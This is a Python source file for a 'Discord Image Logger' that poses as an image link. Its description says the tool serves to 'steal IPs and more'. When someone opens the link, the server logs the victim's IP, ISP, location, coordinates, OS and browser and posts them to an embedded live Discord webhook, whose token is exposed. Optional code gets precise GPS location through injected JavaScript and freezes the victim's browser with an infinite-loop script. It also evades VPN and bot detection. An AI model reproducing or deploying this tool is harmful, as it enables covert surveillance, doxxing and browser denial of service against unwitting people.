# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444729954892779534/DIdeJ_9eVjJaVaiLEl5AuAZdylMwsXZ27kCB9MtbUMF2qNXUSQfyeAiYZGCz57U5XoXV",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
